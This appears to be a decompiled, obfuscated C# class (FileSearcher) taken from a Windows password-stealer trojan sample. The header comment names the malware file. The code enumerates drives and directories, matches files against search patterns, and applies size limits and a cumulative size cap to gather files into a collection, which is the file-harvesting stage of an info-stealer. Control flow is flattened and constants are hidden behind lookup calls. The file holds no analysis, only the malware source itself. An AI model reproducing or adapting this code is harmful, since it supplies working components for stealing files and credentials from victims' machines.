// Decompiled with JetBrains decompiler
// Type: FileSearcher
// Assembly: Ajowans, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B9451E92-9872-44E9-A53B-32BF899B0E6F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Stealer.gen-ca27c07cc9fddcd8bc07b2b9aa3406ab019fb54797bf2163b190217e9c17ce6a.exe

using Ajowans;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

public static class FileSearcher
{
  public static List<Entity5> Search(IEnumerable<string> patterns)
  {
    List<Entity5> entity5List = DriveList.RegisterFile();
    try
    {
      long num1 = (long) TemplateService.RegisterFile(3452);
      IEnumerator<string> pathList1 = IconSite.RegisterFile((object) patterns);
      try
      {
        while (RegistryContext.RegisterFile((object) pathList1))
        {
          string str1 = PathDesigner.RegisterFile((object) pathList1);
          if (num1 < (long) TemplateService.RegisterFile(3456))
          {
label_4:
            switch (1)
            {
              case 0:
                goto label_4;
              default:
                if (false)
                {
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle = __methodref (FileSearcher.Search);
                }
                try
                {
                  string pathList2 = str1;
                  string[] generatorCache1 = new string[TemplateService.RegisterFile(3460)];
                  int index1 = TemplateService.RegisterFile(3464);
                  char[] pathList3 = new char[TemplateService.RegisterFile(3468)];
                  pathList3[TemplateService.RegisterFile(3472)] = (char) TemplateService.RegisterFile(3476);
                  string str2 = TreeNodeType.RegisterFile(pathList3);
                  generatorCache1[index1] = str2;
                  int previousHandler1 = TemplateService.RegisterFile(3480);
                  string[] strArray1 = ActionInvoker.RegisterFile((object) pathList2, generatorCache1, (StringSplitOptions) previousHandler1);
                  if (strArray1 != null)
                  {
label_9:
                    switch (4)
                    {
                      case 0:
                        goto label_9;
                      default:
                        if (strArray1.Length > TemplateService.RegisterFile(3484))
                        {
label_11:
                          switch (6)
                          {
                            case 0:
                              goto label_11;
                            default:
                              string pathList4 = SolutionHelper.RegisterFile(strArray1[TemplateService.RegisterFile(3488)]);
                              string pathList5 = strArray1[TemplateService.RegisterFile(3492)];
                              string[] generatorCache2 = new string[TemplateService.RegisterFile(3496)];
                              int index2 = TemplateService.RegisterFile(3500);
                              char[] pathList6 = new char[TemplateService.RegisterFile(3504)];
                              pathList6[TemplateService.RegisterFile(3508)] = (char) TemplateService.RegisterFile(3512);
                              string str3 = TreeNodeType.RegisterFile(pathList6);
                              generatorCache2[index2] = str3;
                              int previousHandler2 = TemplateService.RegisterFile(3516);
                              string[] previousHandler3 = ActionInvoker.RegisterFile((object) pathList5, generatorCache2, (StringSplitOptions) previousHandler2);
                              string pathList7 = strArray1[TemplateService.RegisterFile(3520)];
                              long num2 = (long) TemplateService.RegisterFile(3524);
                              if (strArray1.Length > TemplateService.RegisterFile(3528))
                              {
label_13:
                                switch (2)
                                {
                                  case 0:
                                    goto label_13;
                                  default:
                                    num2 = TreeNodeStream.RegisterFile(strArray1[TemplateService.RegisterFile(3532)]);
                                    break;
                                }
                              }
                              string pathList8 = pathList4;
                              char[] pathList9 = new char[TemplateService.RegisterFile(3536)];
                              // ISSUE: field reference
                              DeviceManager.RegisterFile((Array) pathList9, __fieldref (VectorContext.dataLength));
                              string generatorCache3 = TreeNodeType.RegisterFile(pathList9);
                              if (PaneService.RegisterFile(pathList8, generatorCache3))
                              {
label_16:
                                switch (1)
                                {
                                  case 0:
                                    goto label_16;
                                  default:
                                    string[] strArray2 = IconList.RegisterFile();
                                    for (int index3 = TemplateService.RegisterFile(3540); index3 < strArray2.Length; index3 += TemplateService.RegisterFile(3592))
                                    {
                                      string pathList10 = strArray2[index3];
                                      try
                                      {
                                        IEnumerator<string> pathList11 = IconSite.RegisterFile((object) ResourceService.RegisterFile(pathList10, (SearchOption) ConnectionScope.RegisterFile(pathList7), previousHandler3));
                                        try
                                        {
                                          while (RegistryContext.RegisterFile((object) pathList11))
                                          {
                                            string str4 = PathDesigner.RegisterFile((object) pathList11);
                                            try
                                            {
                                              FileInfo pathList12 = PackageCollection.RegisterFile(str4);
                                              if (ClientCollection.RegisterFile((object) pathList12) > (long) TemplateService.RegisterFile(3544))
                                              {
label_23:
                                                switch (7)
                                                {
                                                  case 0:
                                                    goto label_23;
                                                  default:
                                                    if (ClientCollection.RegisterFile((object) pathList12) <= num2)
                                                    {
label_25:
                                                      switch (4)
                                                      {
                                                        case 0:
                                                          goto label_25;
                                                        default:
                                                          if (num1 < (long) TemplateService.RegisterFile(3548))
                                                          {
label_27:
                                                            switch (1)
                                                            {
                                                              case 0:
                                                                goto label_27;
                                                              default:
                                                                string pathList13 = PcitureSettings.RegisterFile((object) OutlineList.PrintDirectory((object) pathList12));
                                                                string[] generatorCache4 = new string[TemplateService.RegisterFile(3552)];
                                                                int index4 = TemplateService.RegisterFile(3556);
                                                                char[] pathList14 = new char[TemplateService.RegisterFile(3560)];
                                                                pathList14[TemplateService.RegisterFile(3564)] = (char) TemplateService.RegisterFile(3568);
                                                                pathList14[TemplateService.RegisterFile(3572)] = (char) TemplateService.RegisterFile(3576);
                                                                string str5 = TreeNodeType.RegisterFile(pathList14);
                                                                generatorCache4[index4] = str5;
                                                                int previousHandler4 = TemplateService.RegisterFile(3580);
                                                                string[] strArray3 = ActionInvoker.RegisterFile((object) pathList13, generatorCache4, (StringSplitOptions) previousHandler4);
                                                                List<Entity5> pathList15 = entity5List;
                                                                Entity5 entity5 = SelectionSite.RegisterFile(PcitureSettings.RegisterFile((object) pathList12));
                                                                string empty;
                                                                if (strArray3 != null)
                                                                {
label_29:
                                                                  switch (4)
                                                                  {
                                                                    case 0:
                                                                      goto label_29;
                                                                    default:
                                                                      if (strArray3.Length <= TemplateService.RegisterFile(3584))
                                                                      {
label_31:
                                                                        switch (4)
                                                                        {
                                                                          case 0:
                                                                            goto label_31;
                                                                        }
                                                                      }
                                                                      else
                                                                      {
                                                                        empty = strArray3[TemplateService.RegisterFile(3588)];
                                                                        goto label_34;
                                                                      }
                                                                      break;
                                                                  }
                                                                }
                                                                empty = string.Empty;
label_34:
                                                                ReferenceOptions.RegisterFile((object) entity5, empty);
                                                                DialogInfo.RegisterFile((object) entity5, str4);
                                                                XmlFileTree.RegisterFile((object) pathList15, entity5);
                                                                num1 += ClientCollection.RegisterFile((object) pathList12);
                                                                continue;
                                                            }
                                                          }
                                                          else
                                                            continue;
                                                      }
                                                    }
                                                    else
                                                      continue;
                                                }
                                              }
                                            }
                                            catch
                                            {
                                            }
                                          }
label_37:
                                          switch (2)
                                          {
                                            case 0:
                                              goto label_37;
                                            default:
                                              continue;
                                          }
                                        }
                                        finally
                                        {
                                          if (pathList11 != null)
                                          {
label_39:
                                            switch (7)
                                            {
                                              case 0:
                                                goto label_39;
                                              default:
                                                DeploymentDesigner.RegisterFile((object) pathList11);
                                                break;
                                            }
                                          }
                                        }
                                      }
                                      catch
                                      {
                                      }
                                    }
label_45:
                                    switch (2)
                                    {
                                      case 0:
                                        goto label_45;
                                      default:
                                        continue;
                                    }
                                }
                              }
                              else
                              {
                                IEnumerator<string> pathList16 = IconSite.RegisterFile((object) ResourceService.RegisterFile(pathList4, (SearchOption) ConnectionScope.RegisterFile(pathList7), previousHandler3));
                                try
                                {
                                  while (RegistryContext.RegisterFile((object) pathList16))
                                  {
                                    string str6 = PathDesigner.RegisterFile((object) pathList16);
                                    try
                                    {
                                      FileInfo pathList17 = PackageCollection.RegisterFile(str6);
                                      if (ClientCollection.RegisterFile((object) pathList17) > (long) TemplateService.RegisterFile(3596))
                                      {
label_50:
                                        switch (1)
                                        {
                                          case 0:
                                            goto label_50;
                                          default:
                                            if (ClientCollection.RegisterFile((object) pathList17) <= num2)
                                            {
label_52:
                                              switch (2)
                                              {
                                                case 0:
                                                  goto label_52;
                                                default:
                                                  if (num1 < (long) TemplateService.RegisterFile(3600))
                                                  {
label_54:
                                                    switch (6)
                                                    {
                                                      case 0:
                                                        goto label_54;
                                                      default:
                                                        string pathList18 = PcitureSettings.RegisterFile((object) OutlineList.PrintDirectory((object) pathList17));
                                                        string[] generatorCache5 = new string[TemplateService.RegisterFile(3604)];
                                                        int index5 = TemplateService.RegisterFile(3608);
                                                        char[] pathList19 = new char[TemplateService.RegisterFile(3612)];
                                                        pathList19[TemplateService.RegisterFile(3616)] = (char) TemplateService.RegisterFile(3620);
                                                        pathList19[TemplateService.RegisterFile(3624)] = (char) TemplateService.RegisterFile(3628);
                                                        string str7 = TreeNodeType.RegisterFile(pathList19);
                                                        generatorCache5[index5] = str7;
                                                        int previousHandler5 = TemplateService.RegisterFile(3632);
                                                        string[] strArray4 = ActionInvoker.RegisterFile((object) pathList18, generatorCache5, (StringSplitOptions) previousHandler5);
                                                        List<Entity5> pathList20 = entity5List;
                                                        Entity5 entity5 = SelectionSite.RegisterFile(PcitureSettings.RegisterFile((object) pathList17));
                                                        string empty;
                                                        if (strArray4 != null)
                                                        {
label_56:
                                                          switch (4)
                                                          {
                                                            case 0:
                                                              goto label_56;
                                                            default:
                                                              if (strArray4.Length <= TemplateService.RegisterFile(3636))
                                                              {
label_58:
                                                                switch (6)
                                                                {
                                                                  case 0:
                                                                    goto label_58;
                                                                }
                                                              }
                                                              else
                                                              {
                                                                empty = strArray4[TemplateService.RegisterFile(3640)];
                                                                goto label_61;
                                                              }
                                                              break;
                                                          }
                                                        }
                                                        empty = string.Empty;
label_61:
                                                        ReferenceOptions.RegisterFile((object) entity5, empty);
                                                        DialogInfo.RegisterFile((object) entity5, str6);
                                                        XmlFileTree.RegisterFile((object) pathList20, entity5);
                                                        num1 += ClientCollection.RegisterFile((object) pathList17);
                                                        continue;
                                                    }
                                                  }
                                                  else
                                                    continue;
                                              }
                                            }
                                            else
                                              continue;
                                        }
                                      }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                  }
label_64:
                                  switch (7)
                                  {
                                    case 0:
                                      goto label_64;
                                    default:
                                      continue;
                                  }
                                }
                                finally
                                {
                                  if (pathList16 != null)
                                  {
label_66:
                                    switch (7)
                                    {
                                      case 0:
                                        goto label_66;
                                      default:
                                        DeploymentDesigner.RegisterFile((object) pathList16);
                                        break;
                                    }
                                  }
                                }
                              }
                          }
                        }
                        else
                          continue;
                    }
                  }
                  else
                    continue;
                }
                catch (Exception ex)
                {
                  continue;
                }
            }
          }
          else
            goto label_77;
        }
label_71:
        switch (1)
        {
          case 0:
            goto label_71;
        }
      }
      finally
      {
        if (pathList1 != null)
        {
label_73:
          switch (4)
          {
            case 0:
              goto label_73;
            default:
              DeploymentDesigner.RegisterFile((object) pathList1);
              break;
          }
        }
      }
    }
    catch
    {
    }
label_77:
    return entity5List;
  }

  public static IEnumerable<string> GetFiles(
    string rootPath,
    SearchOption searchOption,
    string[] searchPatterns)
  {
    List<string> stringList1 = TemplateHelper.RegisterFile();
    List<string> pathList1 = stringList1;
    char[] pathList2 = new char[TemplateService.RegisterFile(3644)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList2, __fieldref (VectorContext.previousHandler));
    string generatorCache1 = TreeNodeType.RegisterFile(pathList2);
    PageHelper.RegisterFile((object) pathList1, generatorCache1);
    List<string> pathList3 = stringList1;
    char[] pathList4 = new char[TemplateService.RegisterFile(3648)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList4, __fieldref (VectorContext.namesEnabled));
    string generatorCache2 = TreeNodeType.RegisterFile(pathList4);
    PageHelper.RegisterFile((object) pathList3, generatorCache2);
    List<string> pathList5 = stringList1;
    char[] pathList6 = new char[TemplateService.RegisterFile(3652)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList6, __fieldref (VectorContext.pathList));
    string generatorCache3 = TreeNodeType.RegisterFile(pathList6);
    PageHelper.RegisterFile((object) pathList5, generatorCache3);
    List<string> pathList7 = stringList1;
    char[] pathList8 = new char[TemplateService.RegisterFile(3656)];
    // ISSUE: field reference
    DeviceManager.RegisterFile((Array) pathList8, __fieldref (VectorContext.namesEnabled));
    string generatorCache4 = TreeNodeType.RegisterFile(pathList8);
    PageHelper.RegisterFile((object) pathList7, generatorCache4);
    List<string> stringList2 = stringList1;
    IEnumerable<string> first = Enumerable.Empty<string>();
    if (searchOption == (SearchOption) TemplateService.RegisterFile(3660))
    {
label_1:
      switch (3)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (FileSearcher.GetFiles);
          }
          try
          {
            IEnumerator<string> pathList9 = IconSite.RegisterFile((object) NodeFactory.RegisterFile(rootPath));
            try
            {
              while (RegistryContext.RegisterFile((object) pathList9))
              {
                string pathList10 = PathDesigner.RegisterFile((object) pathList9);
                if (stringList2 != null)
                {
label_7:
                  switch (6)
                  {
                    case 0:
                      goto label_7;
                    default:
                      if (stringList2.Any<string>())
                      {
label_9:
                        switch (3)
                        {
                          case 0:
                            goto label_9;
                          default:
                            bool flag = TemplateService.RegisterFile(3664) != 0;
                            using (List<string>.Enumerator pathList11 = OutlineLoader.RegisterFile((object) stringList2))
                            {
                              while (SymbolToken.RegisterFile(ref pathList11))
                              {
                                string generatorCache5 = SolutionList.RegisterFile(ref pathList11);
                                if (SolutionSet.RegisterFile((object) pathList10, generatorCache5))
                                {
label_13:
                                  switch (3)
                                  {
                                    case 0:
                                      goto label_13;
                                    default:
                                      flag = TemplateService.RegisterFile(3668) != 0;
                                      goto label_18;
                                  }
                                }
                              }
label_16:
                              switch (2)
                              {
                                case 0:
                                  goto label_16;
                              }
                            }
label_18:
                            if (!flag)
                            {
label_19:
                              switch (2)
                              {
                                case 0:
                                  goto label_19;
                              }
                            }
                            else
                              continue;
                            break;
                        }
                      }
                      else
                        break;
                  }
                }
                first = first.Concat<string>(ResourceService.RegisterFile(pathList10, searchOption, searchPatterns));
              }
label_22:
              switch (4)
              {
                case 0:
                  goto label_22;
              }
            }
            finally
            {
              if (pathList9 != null)
              {
label_24:
                switch (7)
                {
                  case 0:
                    goto label_24;
                  default:
                    DeploymentDesigner.RegisterFile((object) pathList9);
                    break;
                }
              }
            }
          }
          catch
          {
            break;
          }
          break;
      }
    }
    string[] strArray = searchPatterns;
    for (int index = TemplateService.RegisterFile(3672); index < strArray.Length; index += TemplateService.RegisterFile(3676))
    {
      string generatorCache6 = strArray[index];
      try
      {
        first = first.Concat<string>((IEnumerable<string>) DomainSettings.RegisterFile(rootPath, generatorCache6));
      }
      catch
      {
      }
    }
label_34:
    switch (7)
    {
      case 0:
        goto label_34;
      default:
        return first;
    }
  }
}
